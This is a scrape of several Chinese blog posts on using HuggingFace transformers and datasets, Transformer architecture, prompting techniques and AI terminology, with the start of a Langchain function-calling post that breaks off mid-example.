用于多选任务模型\n\u0026hellip; AutoModel 与其子类 AutoModelForXXX 对比:\nAutoModel 提供的一些基础能力，AutoModelForXXX 根据任务类型提供了一些额外的能力 AutoModel 只包含 Encoder，AutoModelForXXX 包含 Encoder 和 Decoder AutoModel 用于文本编码、特征提取，AutoModelForXXX 用于训练模型、生成文本 1 2 3 4 from transformers import AutoModelForCausalLM model_name = \u0026#34;LinkSoul/Chinese-Llama-2-7b\u0026#34; model = AutoModelForCausalLM.from_pretrained(model_name) 2.4 保存模型与分词 模型 1 2 save_directory = \u0026#34;/Volumes/Data/HuggingFace/\u0026#34; model.save_pretrained(save_directory + \u0026#34;model\u0026#34;) 1 2 3 ls /Volumes/Data/HuggingFace/model config.json pytorch_model.bin 分词 1 2 save_directory = \u0026#34;/Volumes/Data/HuggingFace/\u0026#34; tokenizer.save_pretrained(save_directory + \u0026#34;tokenizer\u0026#34;) 1 2 3 4 ls /Volumes/Data/HuggingFace/tokenizer merges.txt tokenizer.json vocab.json special_tokens_map.json tokenizer_config.json 3. transformers 中的分词器 分词器的作用就行实现输入与模型可以理解的输入格式之间的转换。因此有两个方向的转换：\n将输入的文本转换成模型可以理解的输入格式 将模型输出的结果转换成人类可以理解的格式 AutoTokenizer 会根据 model 的类型自动选择合适的分词器。需要注意的是，预训练模型与分词器是配套使用的。如果使用了 cardiffnlp/twitter-roberta-base-sentiment-latest 模型，就应该使用 cardiffnlp/twitter-roberta-base-sentiment-latest 分词器，否则效果会很差。\n1 2 3 4 from transformers import AutoTokenizer model_id = \u0026#34;cardiffnlp/twitter-roberta-base-sentiment-latest\u0026#34; tokenizer = AutoTokenizer.from_pretrained(model_id) 3.1 单个句子 1 2 text = \u0026#34;我爱北京天安门\u0026#34; tokenizer(text) 1 {\u0026#39;input_ids\u0026#39;: [0, 47876, 3602, 36714, 23133, 15389, 48418, 6800, 46499, 11582, 49429, 47089, 23171, 49117, 11423, 2], \u0026#39;attention_mask\u0026#39;: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]} 3.2 多个句子 1 {\u0026#39;input_ids\u0026#39;: [[0, 47876, 3602, 36714, 23133, 15389, 48418, 6800, 46499, 11582, 49429, 47089, 23171, 49117, 11423, 2], [0, 49429, 47089, 23171, 49117, 11423, 48827, 47983, 10278, 41907, 711, 15264, 47658, 6382, 2]], \u0026#39;attention_mask\u0026#39;: [[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]} 3.3 分词器参数 1 2 3 4 5 text = \u0026#34;我爱北京天安门\u0026#34; tokenizer(text, padding=True, truncation=True, max_length=512) 1 {\u0026#39;input_ids\u0026#39;: [0, 47876, 3602, 36714, 23133, 15389, 48418, 6800, 46499, 11582, 49429, 47089, 23171, 49117, 11423, 2], \u0026#39;attention_mask\u0026#39;: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]} padding：是否填充，如果为 True，会将所有句子填充到相同长度 truncation：是否截断，如果为 True，会将所有句子截断到相同长度 max_length：填充或截断后的句子长度 输出中 input_ids 是分词后的结果，attention_mask 是注意力掩码，用于指示哪些是真实的输入，哪些是填充的。\n4. transformers 中的模型配置类 模型配置是模型的超参数，比如 Bert 模型的隐藏层大小、注意力头的数量等。\n1 2 3 4 from transformers import AutoConfig model_id = \u0026#34;cardiffnlp/twitter-roberta-base-sentiment-latest\u0026#34; config = AutoConfig.from_pretrained(model_id) 修改模型配置 下面这个模型的注意力头数量是 12，这里将其修改为 11。\n1 2 3 4 from transformers import AutoConfig model_id = \u0026#34;cardiffnlp/twitter-roberta-base-sentiment-latest\u0026#34; my_config = AutoConfig.from_pretrained(model_id, num_attention_heads=11) 根据模型配置创建模型 1 2 3 from transformers import AutoModel my_model = AutoModel.from_config(my_config) 可以通过这种方式，修改模型的参数，调试模型的效果。\n5. 总结 本篇主要是介绍了 transformers 中的 pipeline、模型类、分词器、模型配置类等。pipeline 提供了便捷的方式，将分词器、模型处理、后处理器等组合在一起，方便用户使用。AutoModel 类会根据 model 的类型自动选择合适的模型类。AutoTokenizer 会根据 model 的类型自动选择合适的分词器。AutoConfig 会根据 model 的类型自动选择合适的模型配置类。\n","description":"","id":99,"section":"post","tags":["整理","Transformer","AI","大模型","NLP"],"title":"transformers 库的使用","uri":"https://www.chenshaowen.com/blog/usage-of-transformers-lib.html"},{"content":"HuggingFace 通过提供共享模型 model、数据集 dataset、在线托管 space 等服务，为 AI 研究人员和开发者提供了一个完整的生态。本篇文章将介绍如何使用 HuggingFace 的模型和数据集。\n1. 模型操作与使用 1.1 自定义存储目录 1 export HF_HOME=/Volumes/Data/HuggingFace 否则默认在 ~/.cache/huggingface 目录下。\n1.2 模型的下载 第一种方法，页面上点击下载到本地\nhttps://huggingface.co/LinkSoul/Chinese-Llama-2-7b/tree/main 点击文件列表中的下载 Icon 。\n第二种方法，使用 Git LFS 下载\n在安装 git-lfs 之后，执行命令:\n1 git lfs install 下载模型到本地:\n1 git clone https://huggingface.co/LinkSoul/Chinese-Llama-2-7b 第三种方法，使用 huggingface-hub 下载\n1 pip install huggingface_hub 1 2 from huggingface_hub import snapshot_download snapshot_download(repo_id=\u0026#34;LinkSoul/Chinese-Llama-2-7b\u0026#34;) 第四种方法，使用 transformers 使用时，在线下载\n1 pip install transformers 1 2 from transformers import AutoModelForCausalLM model = AutoModelForCausalLM.from_pretrained(\u0026#34;LinkSoul/Chinese-Llama-2-7b\u0026#34;) 1.3 模型的操作 加载模型 1 2 3 from transformers import AutoModelForCausalLM model = AutoModelForCausalLM.from_pretrained(\u0026#34;LinkSoul/Chinese-Llama-2-7b\u0026#34;) 保存模型 1 2 3 4 from transformers import AutoModelForCausalLM model = AutoModelForCausalLM.from_pretrained(\u0026#34;LinkSoul/Chinese-Llama-2-7b\u0026#34;) model.save_pretrained(\u0026#34;/Volumes/Data/HuggingFace/Chinese-Llama-2-7b-v2\u0026#34;) 1.4 模型的使用 安装依赖 1 pip install transformers torch 使用模型 1 2 3 4 5 6 7 8 9 10 11 12 from transformers import EncoderDecoderModel, AutoTokenizer model_id = \u0026#34;raynardj/wenyanwen-chinese-translate-to-ancient\u0026#34; model = EncoderDecoderModel.from_pretrained(model_id) tokenizer = AutoTokenizer.from_pretrained(model_id) def chat(text): input_ids = tokenizer.encode(text, return_tensors=\u0026#39;pt\u0026#39;) output = model.generate(input_ids, max_length=40) return tokenizer.decode(output[0], skip_special_tokens=True) chat(\u0026#34;你好\u0026#34;) 1 汝 好 2. Dataset 操作与使用 2.1 数据集的下载 安装 datasets 1 pip install datasets 下载数据集 进入 Ipython\n1 ipython 1 2 In [1]: import datasets In [2]: remote_datasets = datasets.load_dataset(\u0026#34;fka/awesome-chatgpt-prompts\u0026#34;) 此时，数据集将被下载到 $HF_HOME/datasets 目录下。类似模型的下载，数据集也可以在页面上下载、Git LFS 下载，在此不再赘述。\n查看数据集合 1 2 3 4 5 6 7 8 9 10 11 12 13 tree -L 2 $HF_HOME/datasets /Volumes/Data/HuggingFace/datasets ├── _Volumes_Data_HuggingFace_datasets_fka___awesome-chatgpt-prompts_default-18237255be23cc62_0.0.0_eea64c71ca8b46dd3f537ed218fc9bf495d5707789152eb2764f5c78fa66d59d.lock ├── downloads │ ├── 7528ed6bf521cf4a58ed283bfa5ba864e12c7203ad53ea3495ba45326e30768a │ ├── 7528ed6bf521cf4a58ed283bfa5ba864e12c7203ad53ea3495ba45326e30768a.json │ ├── 7528ed6bf521cf4a58ed283bfa5ba864e12c7203ad53ea3495ba45326e30768a.lock │ ├── f41fd13f9d4e803c35d9543c56b1d887676f17d84d10e3a428ad1e46bcce6c78.8fbabec58cee4e6f69e20f509619af34f2b4ed0052c2c39ca0d73a47e1035a8b │ ├── f41fd13f9d4e803c35d9543c56b1d887676f17d84d10e3a428ad1e46bcce6c78.8fbabec58cee4e6f69e20f509619af34f2b4ed0052c2c39ca0d73a47e1035a8b.json │ └── f41fd13f9d4e803c35d9543c56b1d887676f17d84d10e3a428ad1e46bcce6c78.8fbabec58cee4e6f69e20f509619af34f2b4ed0052c2c39ca0d73a47e1035a8b.lock └── fka___awesome-chatgpt-prompts └── default-18237255be23cc62 可以看到存储的目录并不是 fka/awesome-chatgpt-prompts 。不能使用 datasets.load_from_disk(\u0026quot;fka/awesome-chatgpt-prompts\u0026quot;) 加载数据集，load_from_disk 适合直接下载、Git LFS 等方式下载的数据集。\n2.2 数据集的操作 查看数据集 1 2 3 4 5 6 7 8 In [3]: remote_datasets DatasetDict({ train: Dataset({ features: [\u0026#39;act\u0026#39;, \u0026#39;prompt\u0026#39;], num_rows: 153 }) }) 可以看到一共有 153 条数据，数据放在两个字段中，act 和 prompt。\n查看数据 1 2 3 In [4]: remote_datasets[\u0026#34;train\u0026#34;][0] Out[4]: {\u0026#39;act\u0026#39;: \u0026#39;Linux Terminal\u0026#39;, \u0026#39;prompt\u0026#39;: \u0026#39;I want you to act as a linux terminal. I will type commands and you will reply with what the terminal should show. I want you to only reply with the terminal output inside one unique code block, and nothing else. do not write explanations. do not type commands unless I instruct you to do so. when i need to tell you something in english, i will do so by putting text inside curly brackets {like this}. my first command is pwd\u0026#39;} 随机选取数据 1 2 3 4 5 6 In [5]: remote_datasets[\u0026#34;train\u0026#34;].select(range(10)) Out[5]: Dataset({ features: [\u0026#39;act\u0026#39;, \u0026#39;prompt\u0026#39;], num_rows: 10 }) 更新列名 1 2 3 4 5 6 7 8 9 In [5]: new_datasets = remote_datasets.rename_column(\u0026#34;act\u0026#34;, \u0026#34;actor\u0026#34;) In [6]: new_datasets Out[6]: DatasetDict({ train: Dataset({ features: [\u0026#39;actor\u0026#39;, \u0026#39;prompt\u0026#39;], num_rows: 153 }) }) filter 过滤数据 1 2 3 4 5 6 7 8 In [7]: new_datasets.filter(lambda x: \u0026#34;Linux\u0026#34; in x[\u0026#34;actor\u0026#34;]) Out[7]: DatasetDict({ train: Dataset({ features: [\u0026#39;actor\u0026#39;, \u0026#39;prompt\u0026#39;], num_rows: 1 }) }) map 处理数据 1 2 3 4 In [8]: new_datasets.map(lambda x: {\u0026#34;actor\u0026#34;: x[\u0026#34;actor\u0026#34;].upper(), \u0026#34;prompt\u0026#34;: x[\u0026#34;prompt\u0026#34;]})[\u0026#34;train\u0026#34;][0] Out[8]: {\u0026#39;actor\u0026#39;: \u0026#39;LINUX TERMINAL\u0026#39;, \u0026#39;prompt\u0026#39;: \u0026#39;I want you to act as a linux terminal. I will type commands and you will reply with what the terminal should show. I want you to only reply with the terminal output inside one unique code block, and nothing else. do not write explanations. do not type commands unless I instruct you to do so. when i need to tell you something in english, i will do so by putting text inside curly brackets {like this}. my first command is pwd\u0026#39;} sort 排序 1 2 3 4 In [9]: new_datasets.sort(\u0026#34;actor\u0026#34;)[\u0026#34;train\u0026#34;][0] Out[9]: {\u0026#39;actor\u0026#39;: \u0026#39;AI Assisted Doctor\u0026#39;, \u0026#39;prompt\u0026#39;: \u0026#39;I want you to act as an AI assisted doctor. I will provide you with details of a patient, and your task is to use the latest artificial intelligence tools such as medical imaging software and other machine learning programs in order to diagnose the most likely cause of their symptoms. You should also incorporate traditional methods such as physical examinations, laboratory tests etc., into your evaluation process in order to ensure accuracy. My first request is \u0026#34;I need help diagnosing a case of severe abdominal pain.\u0026#34;\u0026#39;} shuffle 乱序 1 2 3 4 In [10]: new_datasets.shuffle(seed=42)[\u0026#34;train\u0026#34;][0] Out[10]: {\u0026#39;actor\u0026#39;: \u0026#39;Tech Reviewer:\u0026#39;, \u0026#39;prompt\u0026#39;: \u0026#39;I want you to act as a tech reviewer. I will give you the name of a new piece of technology and you will provide me with an in-depth review - including pros, cons, features, and comparisons to other technologies on the market. My first suggestion request is \u0026#34;I am reviewing iPhone 11 Pro Max\u0026#34;.\u0026#39;} 随机选取数据 1 2 3 4 5 6 In [11]: new_datasets.shuffle(seed=42)[\u0026#34;train\u0026#34;].select(range(10)) Out[11]: Dataset({ features: [\u0026#39;actor\u0026#39;, \u0026#39;prompt\u0026#39;], num_rows: 10 }) 导出数据集 1 new_datasets.save_to_disk(\u0026#34;fka_awesome-chatgpt-prompts_2\u0026#34;) 数据将保存至 Ipython 工作目录下的 fka_awesome-chatgpt-prompts_2 中。\n","description":"","id":100,"section":"post","tags":["整理","Transformer","AI","模型","HuggingFace","数据集"],"title":"HuggingFace 的模型和数据操作","uri":"https://www.chenshaowen.com/blog/models-and-datasets-on-huggingface.html"},{"content":"1. 为什么是 Transformer 全连接的自注意 以往的 RNN 模型，每个单词只能和邻近的单词产生联系，而 Transformer 模型中的 Attention 机制，单词可以和任意位置的单词产生联系，这样就可以捕捉到全局的上下文信息。\n没有梯度消失问题 RNN 作用在同一个权值矩阵上，使得其最大的特征值小于 1 时，就会出现梯度消失问题。Transformer 中的 Attention 计算是全连接的 softmax 注意力，梯度可以顺畅回传。\n并行计算 以往的模型是顺序计算，Transformer 支持并行计算，能充分发挥 GPU 的计算能力。\n2. 大模型中的 Transformer 一个大模型有多个 Transformer，一个 Transformer 有多个 Encoder Layer 和 Decoder Layer，一个 Encoder Layer 和 Decoder Layer 有多个注意力层（Attention Layer） 和前馈全连接层（Feed Forward Layer）组成。\nBERT 模型包含一个 Encoder 模块，由多个 Transformer 编码器堆叠构成。BERT-Base 模型包含 12 个相同的 Transformer Encoder 结构，BERT-Large 模型包含 24 个。\nGPT-3 模型包含一个 Decoder 模块，由多个 Transformer 解码器堆叠组成。GPT-3 模型大小从 Small 到 XL，解码器的 Transformer 块数量依次为 12、24、36、48。\n3. Transformer 的结构 每一个 Encoder 的输入是下一层 Encoder 输出，最上一层 Encoder 的输出会输入给每一个 Decoder 层。\n每个 Decoder 的输入是下一层 Decoder 输出，最后一层 Decoder 的输出会输入给一个线性层，线性层的输出是一个词表大小的向量，每个位置的值表示该位置的词在当前位置的概率。\nEncoder 负责提取输入序列的特征，而 Decoder 是生成输出序列的模块。完整流程可以参考这幅动态图：\n3.1 Encoder Layer 每个 Encoder Layer 由两个子层组成，一个是注意力层（self-Attention Layer），一个是前馈全连接层（Feed Forward Layer）。\n自注意力层（self-Attention Layer） 自注意力层在编码器中用于捕捉输入序列中不同位置之间的关系。\n把输入向量映射到 Query、Key 和 Value 矩阵，进行点积注意力计算，得到单词级注意力表示。\n前馈全连接层（Feed Forward Layer） 引入非线性性，帮助模型更好地学习输入序列中的特征。\n3.2 Decoder Layer 每个 Decoder Layer 由三个子层组成，一个是注意力层（self-Attention Layer），一个是编码器-解码器互注意力层 (Encoder-Decoder Attention Layer)，一个是前馈全连接层（Feed Forward Layer）。\n自注意力层（self-Attention Layer） 计算目标序列中单词之间的相关性，捕捉内部依赖关系。\n类似 Encoder 中的 Self-Attention，但仅根据自己的输入计算注意力。\n编码器-解码器互注意力层 (Encoder-Decoder Attention Layer) 编码器-解码器注意力层在序列到序列模型中连接输入和输出，通过动态调整关注位置，提升模型性能，处理长距离依赖，增强生成准确性。\n前馈全连接层（Feed Forward Layer） 引入非线性变换，进一步增强表达能力。\n3.3 Self-Attention 计算 第一步，这里 X 表示输入，计算查询矩阵 Q，键矩阵 K 和 值矩阵 V\n其中\nWq 用于生成查询（Query）的线性变换矩阵 Wk 用于生成键（Key）的线性变换矩阵 Wv 用于生成值（Value）的线性变换矩阵 Wq、Wk 和 Wv 是模型参数，通过训练学习得到。\n第二步，计算注意力得分\n3.4 Word Embedding 矩阵 Word Embedding 矩阵是用于将单词符号表示转换为稠密词向量的矩阵。\n在 Transformer 的 Self-Attention 机制中，Query 矩阵、Key 矩阵和 Value 矩阵的大小与模型 Word Embedding 大小相关。一般来说，几百到上千维是较常见的设定。低维无法充分表达语义信息，过高维会带来计算量负担。\n在训练过程中，模型不仅会更新权重矩阵，同时还会更新词向量表（Word Embedding 矩阵）。模型通过在大规模语料上预训练，学习到词向量表和各层的权重矩阵，编码语言知识。\n在推理阶段，词向量表是固定的，不会再被更新，用于转换输入文本为向量表示。权重矩阵也同样固定，用来执行推理计算，生成最终输出。\n也就是说，训练阶段更新了 Embedding 矩阵和权重矩阵，而推理阶段二者均固定不变，仅执行前向计算，不再更新模型参数。\n4. 多头注意力机制 相较于单头注意力机制，多头注意力机制可以让模型同时关注不同位置的语义信息，从而提升模型表达能力。\n头数 常用的多头设计是 8 头或 12 头，也有一些模型使用 16 头。头数越多，每个头可以关注的粒度越细，但计算量也线性增加\n头与头之间的差别 每个头的 QKV 不同，关注的语义信息也不通，比如一个聚焦主要信息、另一个聚焦背景信息。\n利用多头注意力机制，可以实现多模态的大模型，处理不同类型的数据，比如文本、图片、音频等。\n","description":"","id":101,"section":"post","tags":["整理","Transformer","AI","大模型"],"title":"Transformer 学习笔记","uri":"https://www.chenshaowen.com/blog/learning-notes-of-transformer.html"},{"content":"1. 大模型到底是什么 先请两位大模型回答一下这个问题，看看他们的回答是什么。\nClaude 说，大模型本质上是语言知识的概率表达，通过统计学习对语言各层次规律建模，表征语言生成的先验分布，从而具备语言预测生成能力。\nChatGPT 说，大模型本质是深度神经网络通过大量参数和数据，学习抽象表示，解决复杂任务，但需要高计算和资源投入。\n根据他们的回答，大模型本质上是统计出来的知识分布。但为什么以前的统计手段没有 GPT-3.5 这种效果呢？主要原因有很多，大部分都强调的是训练数据量、算力、模型参数、Transformer 等。\n但作为一个使用者，我更关注如何从输入的角度，优化对大模型的使用，提升效果。\n2. 影响使用大模型的技术因素 2.1 Prompt learning - 提供一些示例、期望 Zero-shot 不使用任何训练示例，完全通过模型本身的知识去生成 prompt，然后完成下游任务。\nOne-shot 只使用一个很小的示例 prompt，让模型学习下游任务的格式，然后生成新的 prompt 去完成任务。\nFew-shot 使用 2 到 10 个左右的示例 prompt，让模型学习下游任务的特征，然后用来生成更多 prompt。\n提供的 prompt 越多，结果越好。提供样例的格式越接近下游任务，结果越好。\n输入\n1 2 3 4 5 6 生成一组随机浮点数 Let\u0026#39;s think step by step 这里有一些示例 生成一组随机数 -\u0026gt; [1, 5, 6] 生成一组随机变量 -\u0026gt; [a, b, c] 会生成\n1 生成一组随机浮点数 -\u0026gt; [2.3, 4.8, 1.5] 而输入\n1 生成一组随机浮点数 会生成 Python、JavaScript 生成随机数的脚本。\n为了得到更好的结果，我们需要提供一些 prompt 说明大模型扮演什么角色、问题的描述、产生的背景、预期的结果，让大模型知道我们想要的结果是什么。\n2.2 思维链（Chain-of-Thought）- 让大模型一步一步的思考 传统的大模型类似一个黑盒，只是输出结果，无法充分利用知识。思维链技术就是让大模型分解问题，一个一个的解决，然后得到最终结果。\n为了避免大模型进入错误的知识空间，我们甚至可以提供一些解决的的思路和框架。\n输入\n1 玩杂耍的人有 16 个球。一半的球是高尔夫球，一半的高尔夫球是蓝色的。有多少个蓝色的高尔夫球? 会生成\n1 根据题目中的描述，有 16 个球，其中一半是高尔夫球，即 8 个。而又有一半的高尔夫球是蓝色的，所以蓝色的高尔夫球数量为高尔夫球数量的一半，即 8 个。 这个答案是不对的，正确答案是 4\n但如果输入之后，在每个句子后面加上一个提示【请一步一步的思考】，就会得到正确的答案。\n1 玩杂耍的人有16个球。一半的球是高尔夫球，一半的高尔夫球是蓝色的。有多少个蓝色的高尔夫球? 请一步一步的思考。 会生成\n1 2 3 4 5 6 7 8 9 10 11 12 当我们一步一步思考这个问题时： 玩杂耍的人有16个球。 一半的球是高尔夫球，即8个球是高尔夫球。 一半的高尔夫球是蓝色的。 现在我们来计算有多少个蓝色的高尔夫球： 由于一半的高尔夫球是蓝色的，我们可以将高尔夫球数量除以2来得到蓝色高尔夫球的数量。 蓝色高尔夫球数量 = 高尔夫球数量的一半 = 8个球的一半 = 4个蓝色的高尔夫球。 所以，玩杂耍的人手中有4个蓝色的高尔夫球。 可以看到结果的准确性有了显著改善。这是因为，大模型在自己的引导下，进入了正确的知识空间；当然你也可以直接提供给大模型一个思考框架，让它按照你的思路去思考。\n2.3 输入文本越长效果越差 - 控制输入长度 如果输入的文本超过了大模型最大 token 长度，大模型会自动截断输入、丢失上下文信息，导致结果不准确。\n在不超过大模型最大 token 长度的情况下，输入文本长度的增加，也会导致大模型效果下降。\n有研究表明，大模型在处理长文本时，会忽略中间部分的信息，只关注开头和结尾的信息。https://arxiv.org/pdf/2307.03172.pdf\n因此，不要因为模型支持 100K 的 token 输入，就真的输入 100k 的 token，而是可以拆分为多个小段，然后分别输入，再汇总。\n3. 参考 https://github.com/openai/openai-cookbook/blob/main/techniques_to_improve_reliability.md ","description":"","id":102,"section":"post","tags":["整理","AI","大模型","思考"],"title":"影响使用大模型的技术因素","uri":"https://www.chenshaowen.com/blog/the-key-factors-while-using-large-models.html"},{"content":"1. 关键字 机器学习(ML)\n从数据中自动获取知识的技术\n神经网络(NN)\n模仿生物神经网络结构和学习机制的模型，是机器学习的分支之一\n神经网络的结构包括，输入层、隐藏层、输出层\n深度神经网络(DNN)\n隐含层常常大于 2 层\nDNN 的出众表现源于它使用统计学方法从原始感官数据中提取高层特征。\n循环神经网络(RNN)\nDNN 的网络并无记忆，输出与之前网络的输入无关。 RNN 是有内在记忆的，允许长期依存关系影响输出。\nRNN 的中间运算的状态值会被存储在网络中，被用于处理后续的输入运算。\n代价函数(Cost Function)也称损失函数(Loss Function)\n衡量神经网络在当前参数下的训练或预测误差的函数。\n模型训练的目标，训练时，需要通过梯度下降法不断减少损失函数的值，收敛到一个稳定值。\n常见的损失函数有，均方误差、交叉熵、对数尖锐度等。\n梯度下降法(Gradient Descent)\n一种参数优化算法，按照梯度方向移动，就像山顶向山谷下降一样，最终达到某个局部最小值点。\n缺陷时，可能存在收敛慢、陷入局部最小值点的缺点。\n梯度可以理解为偏导数、变化率，沿着负梯度方向，函数减少得最快。\n学习率(Learning rate)\n控制梯度下降过程中，参数更新步长的超参数。\n监督学习(Supervised learning)\n在训练过程中，使用了带有标注的数据。\n自监督学习(Self-supervised Learning)\n在无标注的数据中自动生成标签，用于训练。\n强化学习(Reinforcement learning)\n在训练过程中，引入奖励机制，模拟人通过试错来进行学习的过程，感知环境状态，获得最大化积累的奖励。\n迁移学习(Transfer Learning)\n将源任务中学到的知识迁移到目标任务中，从而提高目标任务的学习效率。源任务的模型参数作为目标任务初始化的起点。\n大模型(Large Model)\n参数规模非常大的机器学习和深度学习模型，参数量级在百亿级。\n小模型(Small Model)\n参数规模量级小于一个亿级，模型大小小于 100MB、可以在单台设备上高效训练。\nSelf-Attention\n让模型学习词元之间的相关性，是 Transformer 模型的核心机制。\n实现对序列的并行建模。\nTransformer\n基于注意力机制的一种神经网络结构。\n允许模型同时关注不同位置的信息。\n相较于 RNN 在并行运算方面具有显著优势。\n对齐\n大模型训练数据有偏见，不能与人的理想的价值观保持一致\n通过各种手段保障，模型输出的内容符合主流\nRLHF(Recursive Human Feedback)\n通过用户的反馈，改进大模型的对齐方式\n微调(Fine-tuning)\n借助其他任务训练的模型，在目标任务数据集上，通过微调将预训练模型转换为自定义模型\n大模型量化\n模型参数从浮点数转换为低位整数的技术。\n通过损失精度，降低设备要求、提升速度。\n全精度(32 位浮点数）- 半精度量化(16 位浮点数) - 8 位整数 - 4 位整数。\nEmbedding\n将高维离散输入映射到低维稠密向量，提升模型效率。\n通过词向量的距离表示词语之间的关系。\n低维稠密向量\n用比原始表示更少的维度来表示每个样本，样本之间的距离更能反映他们之间的关系。\n词表扩充\n避免未编码的词被设置为 [UNK]，损失语义信息\nbatchSize\n定义神经网络每次迭代需要向模型输入多少训练样本\n越大消耗资源越多，速度越快；越小越不稳定，但省资源\n样本数 = batchSize * 迭代次数\n一般从 2 的幂数值开始试验，典型范围是 16 到 512 之间。\nPreplexity\nPreplexity 衡量的是给定测试样本，模型预测下一个词的不确定性或困惑度。\nPreplexity 是语言模型的评价指标，越小越好。\n2. 过程和步骤 2.1 神经网络的训练过程 初始化网络参数（权重和偏置） 在训练数据集上按照当前参数向前计算，得到损失函数 计算损失函数关于当前参数的梯度 根据梯度下降法，结合学习率，更新网络参数 重复 2~4 进行多轮迭代，更新参数 当损失函数值收敛或达到预设迭代次数时，结束训练 2.2 大模型的训练过程 训练一个大模型(Large Model)的主要过程包括:\n数据准备，收集和整合海量训练数据 预训练，在大数据集上预训练模型，初始化模型的参数。目前主要通过自监督方式进行预训练。 模型构建，设计模型的网络结构，如 Transformer、ResNet 等结构。structure Affect Indicators。 分布式训练，在多 GPU 或多节点的分布式环境下进行训练，以提高速度。需要实现数据并行等技术。 超参数优化，调节 batchSize 、学习率等超参数，进行多轮训练以取得最佳结果。 模型压缩，使用知识蒸馏等方法压缩模型大小，以便实际部署。 精调并部署，在下游任务上使用精调，将预训练的通用模型转换为专用模型，然后部署服务。 2.3 设置学习率的过程 先选择一个较大的学习率作为起始值，例如 0.01 使用此其实学习率训练一段时间观察损失函数的变化 如果损失函数波动较大或者发散，则减小学习率，例如减小 10 倍至 0.001 找到一个能稳定减小损失函数的学习率，然后继续训练直至收敛 2.4 Self-Attention 的计算过程 将输入序列 X 转化为 Query(Q)、Key(K)和 Value(V)矩阵。 计算 Query 和 Key 的点积，然后除以缩放因子，得到注意力分数矩阵(Attention Score)。这里反映了每个词元相对位置的相关性。 对注意力分数矩阵做 softmax ，得到注意力权重(Attention Weight)。权重之和为 1。 将 V 和注意力权重相乘，即对 Value 进行加权求和，得到输出表示 Z。 Z 作为此模块的输出，可以传递到下一层。 3. 疑问 3.1 各种神经网络的比较 网络类型 适用场景 前提条件 卷积神经网络(CNN) 图像处理、计算机视觉 网格数据如图像,需要转换卷积操作 循环神经网络(RNN) 语音识别、文本分析 序列数据,需要处理时间依赖关系 深度信念网络(DBN) 降维、特征学习 高维稠密数据,需要层层抽象表达 自动编码器(AE) 降维、去噪 高维数据,需要压缩表示 生成对抗网络(GAN) 生成模型、模拟样本 需要训练判别器与生成器模型对抗 迁移学习(TL) 跨领域、跨任务 源任务与目标任务有一定相关性 强化学习(RL) 智能体决策、控制 需要设计奖惩机制,探索环境 图神经网络(GNN) 图结构数据,网络分析 关系数据可表示为图,需要在图上进行推理 3.2 Transformer 与传统神经网络比较 对比项 Transformer 传统神经网络 网络结构 仅基于注意力机制的编码器-解码器 卷积层、全连接层等 主要组成单元 多头自注意力模块 卷积核、神经元 并行计算 高度并行 CNN 有一定并行度 训练速度 快 RNN 训练较慢 计算复杂度 高 CNN 和 DNN 中等 对长序列建模 效果好,远距离依赖 RNN 效果较差 对网格数据学习 需设计,不如 CNN CNN 效果好 提取特征 内部注意力学习 需要人工特征工程 模型大小 大 DNN 大小中等 典型应用 NLP 计算机视觉 3.3 如何估算训练大模型所需的 GPU 显存 计算公式 GPU_mem = params * dtype + (embed_size * batch_size + ratio * (params + embed_size * batch_size)) 其中:\nparams 模型参数量 dtype 数据类型精度(FP32 或 FP16 等) embed_size 输入序列 embedding 大小 batch_size batch 大小 ratio 额外开销比例(1.2~2 之间) 下面是一些典型模型的显存需求估算:\n模型 参数量 精度 序列长度 Batch Size Embedding 大小 额外开销比 估算显存 BERT-Base 110M FP32 512 256 768 1.5 33.6 GB GPT-2 中型 770M FP16 1024 64 1024 1.2 15.5 GB GPT-3 175B 175000M 混合精度 2048 2 12*1024 2 2185 GB 3.4 数据挖掘、数据建模和大模型之间的区别 对比点 数据挖掘 数据建模 大模型 目标 发现隐藏规律 建立预测模型 探索通用知识 方法 无监督学习 监督学习 语言模型预训练 数据来源 完整原始数据 结构化数据集 大规模通用数据集 过程 探索性分析 说明性分析 自主学习 算法 聚类、关联规则等 回归、决策树等 Transformer、Attention 等 应用范围 多领域 特定业务 通用 AI 评估 发现新的模式 模型准确率 推理和理解能力 需求 数据分析师 模型工程师 AI 研究者 典型模型 Apriori Logistic 回归 GPT-3 总结:\n数据挖掘偏重探索;数据建模偏重预测;大模型综合两者之长,既可探索知识,又可进行预测与推理。三者可以有效结合,发挥各自优势。\n","description":"","id":103,"section":"post","tags":["整理","AI","LLM","机器学习","大模型"],"title":"AI 基础知识点","uri":"https://www.chenshaowen.com/blog/ai-basic-knowledge.html"},{"content":"\n1. 大模型与 Langchain 很多人可能没有机会训练、甚至微调大模型，但对大模型的使用却是未来趋势。那么，我们应该如何拥抱这一变化呢？答案就是 Langchain。\n大模型提供的是一种泛而通用的基础能力，目前，我看到的有两种主要落地方式：\n基于生成能力的 AIGC，各种剧本、代码、二维码、短视频、分子结构层出不穷\n基于理解能力的 AutoGPT，结合执行引擎，直接修改机器状态，进行自动化控制\n目前，在我们的工作场景中，大模型常常还不足以大量直接替代人的工作。原因有两个：\n很多私有的数据，没有提供给大模型进行训练。需要微调、结合知识库之后，才能达到较好的效果。这是大模型的基础定位决定的\n大模型出来的时间还不够长，ToB 效率工具类服务是以十年为周期的，市场还没有形成\n大模型的落地是必然，现在大模型是我们的 Copilot，以后我们可能就是大模型的 Copilot。结合大模型、贴合业务场景，开发出一些 Copilot 工具、提升效率，是我最近在思考的问题。\n开发应用少不了各种框架。Langchain 的定位就是提供开发大模型应用的框架，以解决大模型落地过程中的一些通用问题。比如，对接多种大模型，Prompt 管理，上下文，外部文档加载，向量库对接，Chains 任务链等。\nLangchain 已经由之前的个人项目转为商业公司运作，2023 年还进行了多轮融资。从中可以看到，创投行业对基于大模型的应用开发是非常看好的。既然投资人已经帮我们做出了判断，我们只需要多学习和使用 Langchain 即可。\n2. 对话直接调用函数 在 2023 年 6 月份，OpenAI 和 Langchain 相继发布了版本，支持直接调用函数。这意味着，大模型不仅仅可以用来聊天，还可以用来触发一些业务逻辑。\n2.1 先看看效果 执行程序 1 python function_bot.py 交互测试 1 2 3 4 manual_input:获取 default 这个命名空间的全部 pod function_bot: [\u0026#34;pod1\u0026#34;, \u0026#34;pod2\u0026#34;, 